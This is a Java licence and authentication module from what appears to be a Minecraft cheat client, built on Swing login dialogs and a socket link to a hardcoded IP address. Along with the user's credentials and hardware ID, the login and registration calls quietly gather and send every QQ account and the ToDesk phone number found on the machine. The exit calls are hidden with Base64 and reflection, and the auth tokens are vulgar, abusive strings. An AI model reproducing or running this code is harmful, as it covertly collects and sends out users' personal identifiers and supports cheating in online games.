package com.heypixel.heypixelmod.obsoverlay.utils.auth;

import cn.paradisemc.ZKMIndy;
import com.heypixel.heypixelmod.obsoverlay.Naven;
import com.heypixel.heypixelmod.obsoverlay.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.world.entity.Entity;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;
import oshi.hardware.ComputerSystem;
import oshi.hardware.GraphicsCard;
import oshi.hardware.HardwareAbstractionLayer;
import verify.client.IRCHandler;
import verify.client.IRCTransport;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;

/**
 * @Author：jiuxian_baka
 * @Date：2025/12/22 03:41
 * @Filename：AuthUtils
 */

@ZKMIndy
public class AuthUtils {
    // 验证成功 代表没过验证 8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈 代表验证通过
    public static AtomicReference<String> authed = new AtomicReference<>();
    public static AtomicReference<String> currentUser = new AtomicReference<>("");

    public static IRCTransport transport;

    public static void init() {
        try {
            transport = new IRCTransport("154.64.244.103", 8888, new IRCHandler() {
                @Override
                public void onMessage(String sender, String message) {
                    ChatUtils.addChatMessage(false, "§7[§bIRC§7]§f " + sender + "§f: " + message);
                }

                @Override
                public void onDisconnected(String message) {
                    new Thread(() -> {
                        try {
                            JDialog dialog = new JDialog();
                            dialog.setAlwaysOnTop(true);
                            JOptionPane.showMessageDialog(dialog, "IRC断开连接: " + message);
                        } catch (Exception ignored) {
                        } finally {
                            System.exit(0);
                        }
                    }).start();

                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException ignored) {
                    }
                    System.exit(0);
                }

                @Override
                public void onConnected() {
                    //                System.out.println("Connected");
                }

                @Override
                public void onLoginResult(boolean success, long expireAt, long timeWindow, String message) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        showTopMessage("登录成功\n到期时间: " + formattedDate);
                        setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
                        Naven.b(null);
                    } else {
                        if (nowTimeWindow != timeWindow) message = "请尝试重新登陆或校准系统时间";
                        showTopMessage("登录失败\n" + message);
                        setAuthStatus("验证成功");
                    }
                }

                @Override
                public void onRegisterResult(boolean success, long expireAt, long timeWindow, String message) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        showTopMessage("注册成功\n到期时间: " + formattedDate);
                        setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
                        Naven.b(null);
                    } else {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        Naven.b(null);
                        if (nowTimeWindow != timeWindow) {
                            showTopMessage("注册成功, 请重启客户端\n到期时间: " + formattedDate);
                            setAuthStatus("验证成功");
                        } else {
                            showTopMessage("注册失败\n" + message);
                            setAuthStatus("验证成功");
                        }
                    }
                }

                @Override
                public void onRechargeResult(boolean success, long expireAt, long timeWindow, String message) {
                    if (success) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(expireAt),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        showTopMessage("充值成功\n到期时间: " + formattedDate);
                    } else {
                        showTopMessage("充值失败\n" + message);
                        showRechargeDialog();
                    }
                }

                @Override
                public void onCloudConfigUploadResult(boolean success, String message, int max) {
                    if (success) {
                        ChatUtils.addChatMessage("§a云配置上传成功！");
                    } else {
                        ChatUtils.addChatMessage("§c云配置上传失败: " + message);
                    }
                }

                @Override
                public void onCloudConfigGetResult(boolean success, String owner, String name, String content, String message) {
                    if (success) {
                        Naven.getInstance().getFileManager().loadConfigFromString(content);
                        if (owner != null && !owner.isEmpty()) {
                            ChatUtils.addChatMessage("§a已加载用户 " + owner + " 的云配置 " + name + "！");
                        } else {
                            ChatUtils.addChatMessage("§a云配置 " + name + " 加载成功！");
                        }
                    } else {
                        ChatUtils.addChatMessage("§c云配置加载失败: " + message);
                    }
                }

                @Override
                public void onCloudConfigDeleteResult(boolean success, String owner, String name, String message) {
                    if (success) {
                        ChatUtils.addChatMessage("§a云配置 " + name + " 删除成功！");
                    } else {
                        ChatUtils.addChatMessage("§c云配置删除失败: " + message);
                    }
                }

                @Override
                public void onCloudConfigListResult(boolean success, java.util.List<String> names, int max, String message) {
                    if (success) {
                        ChatUtils.addChatMessage("§e云配置列表 (" + names.size() + "/" + max + "):");
                        for (String n : names) {
                            ChatUtils.addChatMessage("§7 - §f" + n);
                        }
                    } else {
                        ChatUtils.addChatMessage("§c获取云配置列表失败: " + message);
                    }
                }

                @Override
                public String getInGameUsername() {
                    Minecraft mc = Minecraft.getInstance();
                    if (mc.player == null) return mc.getUser().getName();
                    else return mc.player.getName().getString();
                }
            });
        } catch (Throwable e) {
            e.printStackTrace();
            showTopMessage("验证失败: " + e.getMessage());
            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
        }
    }

    private static void showTopMessage(String message) {
        JDialog dialog = new JDialog();
        dialog.setAlwaysOnTop(true);
        JOptionPane.showMessageDialog(dialog, message);
        dialog.dispose();
    }

    private static Entity setAuthStatus(String status) {
        authed.set(status);
        if (status.length() == 32) {
            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass("amF2YS5sYW5nLlN5c3RlbQ==");
                Method exit = System.getMethod("ZXhpdA==", int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
            return null;
        }

        try {
            Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
            Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
            exit.invoke(null, 0);
        } catch (Exception ex) {
        }
        return Minecraft.getInstance().player;
    }

    private static void close(Component c) {
        javax.swing.SwingUtilities.getWindowAncestor(c).dispose();
    }

    public static void showRegisterDialog() {
        try {
            JTextField usernameField = new JTextField();
            JPasswordField passwordField = new JPasswordField();
            JTextField cardKeyField = new JTextField();

            JButton toLogin = new JButton("已有账号？去登录");
            toLogin.addActionListener(e -> {
                close(toLogin);
                showLoginDialog();
            });

            Object[] message = {
                    "用户名:", usernameField,
                    "密码:", passwordField,
                    "卡密", cardKeyField,
                    toLogin
            };

            JDialog dialog = new JDialog();
            dialog.setAlwaysOnTop(true);
            int option = JOptionPane.showConfirmDialog(dialog, message, "用户注册", JOptionPane.OK_CANCEL_OPTION);
            dialog.dispose();

            if (option == JOptionPane.OK_OPTION) {
                String user = usernameField.getText();
                String pass = new String(passwordField.getPassword());
                String card = cardKeyField.getText();
                currentUser.set(user);
                transport.register(user, pass, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone(), card);
            }
        } catch (IOException e) {
            e.printStackTrace();
            showTopMessage("验证失败: " + e.getMessage());

            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
        }
    }

    public static void showLoginDialog() {
        try {
            JTextField usernameField = new JTextField();
            JPasswordField passwordField = new JPasswordField();

            JButton toReg = new JButton("没有账号？去注册");
            JButton toRec = new JButton("去充值");
            toReg.addActionListener(e -> {
                close(toReg);
                showRegisterDialog();
            });
            toRec.addActionListener(e -> {
                close(toRec);
                showRechargeDialog();
            });

            JPanel nav = new JPanel();
            nav.add(toReg);
            nav.add(toRec);

            Object[] message = {
                    "用户名:", usernameField,
                    "密码:", passwordField,
                    nav
            };

            JDialog dialog = new JDialog();
            dialog.setAlwaysOnTop(true);
            int option = JOptionPane.showConfirmDialog(dialog, message, "用户登录", JOptionPane.OK_CANCEL_OPTION);
            dialog.dispose();

            if (option == JOptionPane.OK_OPTION) {
                String user = usernameField.getText();
                String pass = new String(passwordField.getPassword());
                currentUser.set(user);
                transport.login(user, pass, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone());
            }
        } catch (IOException e) {
            e.printStackTrace();
            showTopMessage("验证失败: " + e.getMessage());

            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
        }
    }

    public static void showRechargeDialog() {
        JTextField usernameField = new JTextField();
        JTextField cardKeyField = new JTextField();

        JButton toLogin = new JButton("返回登录");
        toLogin.addActionListener(e -> {
            close(toLogin);
            showLoginDialog();
        });

        Object[] message = {
                "用户名:", usernameField,
                "卡密:", cardKeyField,
                toLogin
        };

        JDialog dialog = new JDialog();
        dialog.setAlwaysOnTop(true);
        int option = JOptionPane.showConfirmDialog(dialog, message, "充值", JOptionPane.OK_CANCEL_OPTION);
        dialog.dispose();

        if (option == JOptionPane.OK_OPTION) {
            String user = usernameField.getText();
            String card = cardKeyField.getText();

            transport.recharge(user, card);
        }
    }

    public static String getHWID() {
        try {
            SystemInfo si = new SystemInfo();
            HardwareAbstractionLayer hal = si.getHardware();

            ComputerSystem computerSystem = hal.getComputerSystem();
            String baseboardSerial = computerSystem.getBaseboard().getSerialNumber();

            CentralProcessor processor = hal.getProcessor();
            String processorId = processor.getProcessorIdentifier().getProcessorID();

            List<GraphicsCard> graphicsCards = hal.getGraphicsCards();
            String gpuInfo = graphicsCards.stream()
                    .map(GraphicsCard::getName)
                    .collect(Collectors.joining("|"));

            String rawID = "Baseboard:" + baseboardSerial +
                    ";CPU:" + processorId +
                    ";GPU:" + gpuInfo;

            return bytesToHex(MessageDigest.getInstance("MD5").digest(rawID.getBytes()));

        } catch (Exception e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "验证失败: " + e.getMessage());

            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
            return "ERROR_GETTING_HWID";
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}
